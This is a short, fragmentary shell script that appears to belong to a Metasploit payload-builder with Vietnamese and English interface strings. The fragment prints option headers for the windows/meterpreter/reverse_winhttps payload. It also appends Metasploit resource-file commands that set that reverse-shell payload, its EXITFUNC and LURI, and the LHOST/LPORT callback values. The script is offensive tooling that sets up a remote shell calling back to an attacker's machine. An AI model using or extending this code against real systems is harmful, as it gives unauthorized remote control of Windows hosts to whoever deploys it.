...
no="     Không "
cat << !
Các tùy chọn của tải trọng (windows/meterpreter/reverse_winhttps):
...
no="     no "
cat << !
Payload options (windows/meterpreter/reverse_winhttps):
...
config_file="$payload_path_present/Config/config"
	echo "set payload windows/meterpreter/reverse_winhttps" >> $rc_file
	echo "set EXITFUNC $exitfunc" >> $rc_file
	echo "set LURI $luri" >> $rc_file
	paylo="windows/meterpreter/reverse_winhttps"
	lhost=$lhost
	lport=$lport
}
